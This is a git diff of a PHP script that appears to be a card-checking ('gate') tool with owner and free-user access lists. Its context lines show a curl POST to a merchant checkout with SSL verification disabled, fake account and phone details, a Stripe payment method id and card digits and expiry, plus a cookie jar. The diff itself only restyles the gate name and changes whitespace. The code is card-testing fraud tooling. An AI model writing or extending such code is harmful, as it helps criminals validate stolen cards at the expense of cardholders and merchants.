@@ -17,7 +17,7 @@ ini_set('error_log', 'errors.log');
       $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
       $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);
 
-$gate = "Stripe 15$";
+$gate = "𝗦𝘁𝗿𝗶𝗽𝗲 𝟭𝟱$";
 
 
     if(in_array($userId, $owners)) {
@@ -351,8 +351,7 @@ sleep(1);
   curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
   curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
   curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=4&checkjavascript=1&other_discount_code=&username='.$pass.'&password=abhyan3434&password2=abhyan3434&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&telephone=09632581470&CardType='.$card_type.'&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX'.$last.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');
-
-
+  
   curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
   curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
